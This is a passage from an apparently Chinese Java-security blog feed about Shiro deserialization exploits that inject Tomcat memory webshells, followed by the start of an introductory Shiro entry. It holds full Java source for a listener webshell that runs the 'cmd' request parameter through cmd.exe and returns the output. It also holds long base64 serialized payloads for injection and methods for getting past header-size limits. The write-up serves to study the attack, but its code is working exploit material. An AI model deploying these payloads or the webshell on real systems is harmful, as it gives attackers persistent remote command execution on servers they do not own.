class="hljs-number">1</span>S8L6IVigZdBGhtTCItFHS2OnwN0riehlQeTV39NZIgqoLqqt2paK<span class="hljs-regexp">/7SgmnfKwtPAaFoygg73PHpEoI4pwtlIppCY0ScNtYjYBoXfsnM0z2YcSTXyk6NiiRT3Ezsc8fbwt0mpqky+WWp+cOZ4q8nREmYppdFj10rzAmsYLG1lT7a4x71Vv/</span>N67hEohjFryioCzPeBwwAqUMYYQMnNsrY2FyAV8Xv6uqud9OX3VrfrNvLUWXZp+KFjz<span class="hljs-regexp">/Or8QHQXznL6Ft5xgxeDkZryTcLK4y523kv6tIYT+4kSDyKSEuk9+vq8Zo5JUrcFtTEdTQPqyr3PGsAGahfH7xAMrkNCUJlY/</span>t2shu+VCVpKH6pMSduiLdWw2JqjHBe5b8haUY3bfL3SxyVv<span class="hljs-regexp">/uYynnXtx8ac/</span><span class="hljs-number">077</span>LLiFrdh374gfIGbrOhXc9jMgJ7Nqj2gguAG1YWPkHrSzs9pYylBt8QR1mAHy4Khrd01kmAUbITRWMYmN28Zq7oyVoWpC4wHv+Y5Pw6YfYWX19XStLbxIJ0CKkvU346hwdeJxjMMkeAIwKWsGuOPoL<span class="hljs-regexp">/qe6ouYeFddQ9AzcoSSMctgyx2+h7zEN53GreQj9iyGZftZaa5AsQ4aEpVQt8Ajts+s7W0rZRcsjIRZ0xfTUzTzo/</span><span class="hljs-number">6</span>aWfWdH74h6OQ2m9zEALGbFyV97ZC2Mr+<span class="hljs-number">7</span>NDrw8FKjXewkVgi2D6xZPGWUKaljugh8Zv9KC8fhU+FSg6eMerYemGwqnsPWTCfbLqiRe2VxQBpDASUXhSWs5tLBDYM5nPkFdaLzUTWsicUCs0p20WM3gHRVu9TU60dp8HiCZDOJsu5NLJljzk2lJkuydLP08FSHKF6UxWnfQwfd<span class="hljs-regexp">/MR0xJISB9JioCTZ0kHOnOLw14fPjZh+63O5LKrCsC4WWzDHVC5h3TgWjXdeTUX7JKbo8Z8tZa/</span>G4CVvDcqsbWXMxQ2nYuCsWx<br></code></pre></td></tr></table></figure><p>注入到 shiro ，发现 shiro 服务器报错了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250424145056562.png" alt="image-20250424145056562"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250424144923385.png" alt="image-20250424144923385"></p><p>请求头太大了，这是 tomcat 的 maxHttpHeaderSize 的限制，我们先手动修改一下 tomcat 的配置文件</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250424201227088.png" alt="image-20250424201227088" style="zoom:50%;" /><p>再次添加就可以注入 filter 内存马了</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250424201156188.png" alt="image-20250424201156188"></p><h3 id="shiro-Listener"><a href="#shiro-Listener" class="headerlink" title="shiro-Listener"></a>shiro-Listener</h3><p>类似的，我们同样可以注入 listener 内存马，这个比 filter 更加轻量级</p><p>相应的注入类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.apache.catalina.connector.Request;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestEvent;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestListener;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">addListener</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123; &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">addListener</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-type">WebappClassLoaderBase</span> <span class="hljs-variable">webappClassLoaderBase</span> <span class="hljs-operator">=</span>(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();<br>        StandardContext standardCtx;<br>        standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();<br>        standardCtx.addApplicationEventListener(<span class="hljs-built_in">this</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>        <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                in = Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c&quot;</span>,req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125;).getInputStream();<br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                <span class="hljs-type">Field</span> <span class="hljs-variable">requestF</span> <span class="hljs-operator">=</span> req.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>                requestF.setAccessible(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (Request)requestF.get(req);<br>                request.getResponse().getWriter().write(out);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (IOException e) &#123;&#125;<br>            <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;&#125;<br>            <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;&#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们只需要把上述的 getEvil() 函数中的 class 改一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvil() <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">ClassPool</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>    <span class="hljs-type">CtClass</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> ctClass.get(addListener.class.getName());<br>    <span class="hljs-keyword">return</span> evil.toBytecode();<br>&#125;<br></code></pre></td></tr></table></figure><p>生成的 payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AAAAAAAAAAAAAAAAAAAAAItICRDL55PQ4M+uF/0QjIxmsxx8mwO0zL+cCUsm9HObVST6ifzXbe1pfVhnBOcNB/avKvCNhZKKEkw8li0SSbf62ZGen2JxK9GPNTlXi10BCSiCCjUZj2I2OccLu/h/iBFMCuLAaK+Qzr6jV6+n8rm8vAp3o7q2HqBXHvAtciY4ur4CJ356Mme5jrqdtaI++cjAuJgvjG3cRsWrMSooPDeAci0crfFK+3Lj3yVUF1Hic+S2UG4nlsv9ixbN2kQ9h96YKRFwc+FVEtLlOyKCsf7cbvPwDlb8zQpfu9I5GlgAyBJ8HToAFRfx+Sc/sXdACA2nQail4+3eEQ+P2avZI0VYatZ4+OJzNUiGmZPWpRvjlaBvMQ4ywEjndwP9d8Ye+tPXJoO8L9bWbXbNk46rBqlO1u4BF0GpEYqwCs88gaQWYwo/aVvajl5hdyY1vBh0/kK2R3WoQ9j4mEBHUVF9de203eoiO+DaWsxmvZkeqpAzdt1EkJ7t1uC1bswdrSmGizBnQcwNK2+6AfRAXvq0ZRYNFWlY3o9rOEWrLX1ZKHbpqj8pJ9N8ikayN8rJwqWOElSs0hHBhEzUk5YzF5XhXpjR4ULmMThYBlQHLX+wk9VmuVQSeVXTXPJ7+vAzQLYkJrKhFq9xAkoTyIU50sStxPThE5whutcJfeNNQEYiYVlslaOAdfzqVaI9nCmWg47MaEyOKgy3e9sHxBED+n1FdCiLU45q<span class="hljs-comment">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</span><br></code></pre></td></tr></table></figure><p>访问带有 cmd 参数，可以看到有回显产生</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250424201917210.png" alt="image-20250424201917210" style="zoom:50%;" /><h3 id="绕过-maxHttpHeaderSize-限制"><a href="#绕过-maxHttpHeaderSize-限制" class="headerlink" title="绕过 maxHttpHeaderSize 限制"></a>绕过 maxHttpHeaderSize 限制</h3><p>有三种方法</p><p>1）修改maxHttpHeaderSize</p><p><a href="http://wjlshare.com/archives/1545">Shiro 550 漏洞学习 (二)：内存马注入及回显</a></p><p>2）将class bytes使用gzip+base64压缩编码</p><p><a href="https://zhuanlan.zhihu.com/p/395443877">tomcat结合shiro无文件webshell的技术研究以及检测方法</a></p><p>3）从POST请求体中发送字节码数据</p><p><a href="https://l3yx.github.io/2020/07/06/Java%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%AD%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%9A%84%E5%BA%94%E7%94%A8/">Java代码执行漏洞中类动态加载的应用</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/244450">Shiro 反序列化漏洞与 Tomcat 注入内存马学习-安全 KER - 安全资讯平台</a></p><p><a href="https://xz.aliyun.com/news/6984">基于 tomcat 的内存 Webshell 无文件攻击技术-先知社区</a></p><p><a href="https://www.javasec.org/javaweb/MemoryShell/">https://www.javasec.org/javaweb/MemoryShell/</a></p><p><a href="https://blog.csdn.net/bring_coco/article/details/131391765">Sangfor 华东天勇战队：shiro 注入 filter 内存马_shiro 注入内存马-CSDN 博客</a></p><p><a href="https://www.cnblogs.com/zpchcbd/p/15167571.html">Java Shiro 反序列化内存马 - zpchcbd - 博客园</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>Shiro</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>Shiro</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro 反序列化</title>
    <link href="/2025/04/21/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/04/21/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="shiro-反序列化"><a href="#shiro-反序列化" class="headerlink" title="shiro 反序列化"></a>shiro 反序列化</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，可执行身份验证、授权、加密和会话管理。借助 Shiro 易于理解的 API，您可以快速轻松地保护任何应用程序 —— 从最小的移动应用程序到最大的 Web 和企业应用程序。</p><p>从官方的简介中就可以看出他是款用来完成权限认证的一个框架</p><h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><p>想要深入了解一下可以去看官方的文章：<a href="https://www.infoq.com/articles/apache-shiro/">Application Security With Apache Shiro - InfoQ</a></p><p>当然也可去从 B 站上找一下对应的教程，时间也不用太长就三四个小时就可以，快速了解一下</p><p>shiro 当在有几个比较重要的概念</p><ul><li><code>Subject</code>： 表示当前执行操作的“用户”</li><li><code>SecurityManager</code>： 负责管理所有的安全操作，像是认证、授权、会话管理等。</li><li><code>Realm</code> 从数据源中获取用户身份信息（认证数据）和用户权限信息（授权数据）。</li><li><code>Principal</code> Realm 认证成功后由它返回的数据，来标识认证通过的客户端（用户）</li></ul><p>基本的认证流程</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250418154009283.png" alt="image-20250418154009283" style="zoom:67%;" /><ol><li><strong>Subject 发起认证请求</strong>（调用 <code>subject.login(token)</code>，token 包含用户凭据，如用户名和密码）。</li><li><strong>SecurityManager 接收到登录请求</strong>，负责协调认证工作，调用底层的 <code>Authenticator</code>。</li><li><strong>Authenticator 调用对应的 Realm</strong>（或多个 Realm）去验证凭证。</li><li><strong>Realm 认证成功返回认证信息</strong> —— 其中包括：<ul><li><strong>Principal</strong>（标识用户身份的信息，比如用户名、用户 ID 等）</li><li>以及凭据相关信息（Credentials）</li></ul></li><li><strong>Authenticator 收集这些信息，封装成 AuthenticationInfo 对象返回给 SecurityManager</strong>。</li><li><strong>SecurityManager 判断认证是否成功</strong>，如果通过，会将对应的 Principal 等信息关联到当前 Subject 中。</li><li>登录流程返回成功，Subject 成为一个已认证状态。</li></ol><p>我们来看一下最基本的代码示例使用，这里借用最简单的 IniRealm 来进行认证</p><p>导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 添加日志依赖 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.30<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-simple<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span 